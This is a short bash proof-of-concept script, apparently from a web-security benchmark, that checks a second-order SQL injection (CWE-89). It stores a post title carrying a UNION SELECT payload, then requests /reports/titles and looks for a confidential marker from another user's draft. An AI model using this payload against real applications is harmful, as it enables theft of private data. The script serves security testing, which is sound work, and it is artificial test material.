#!/usr/bin/env bash
# SQLI-002 (CWE-89, second-order): a post title stored in one request is later
# concatenated into a raw query by /reports/titles, leaking the Globex draft.
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
# slug 'globex-internal' passed as a hex literal to avoid nested quotes.
post /posts \
  --data-urlencode "title=x' UNION SELECT body FROM posts WHERE slug=0x676c6f6265782d696e7465726e616c #" \
  -d "body=z" >/dev/null
curl -s -b "$JAR" "$TARGET/reports/titles" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
